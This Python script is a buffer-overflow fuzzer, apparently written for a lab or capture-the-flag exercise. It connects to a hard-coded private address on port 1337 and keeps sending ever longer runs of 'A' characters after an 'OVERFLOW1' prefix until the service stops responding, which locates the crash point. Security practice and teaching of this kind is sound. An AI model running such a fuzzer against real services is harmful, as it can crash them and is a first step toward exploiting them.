#!/usr/bin/env python3

import socket
import time

IP = "10.10.228.45" # change me
PORT = 1337 # change me
PREFIX = "OVERFLOW1 " # change me
OFFSET = 100
FUZZ = PREFIX + "A" * OFFSET
TARGET = (IP,PORT)

print("[*] Fuzzing: %s" % IP)
while True:
    try:
        CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        CLIENT.settimeout(3)
        CLIENT.connect(TARGET)
        CLIENT.send(bytes(FUZZ, "latin-1"))
        CLIENT.recv(1024)
        CLIENT.close()
        FUZZ_LENGTH = len(FUZZ) - len(PREFIX)
        print("[+] Sent: %d bytes" % FUZZ_LENGTH)
    except socket.error as ERROR:
        print("[!] Failed to connect.")
        exit()
    FUZZ += "A" * 100
    time.sleep(1)
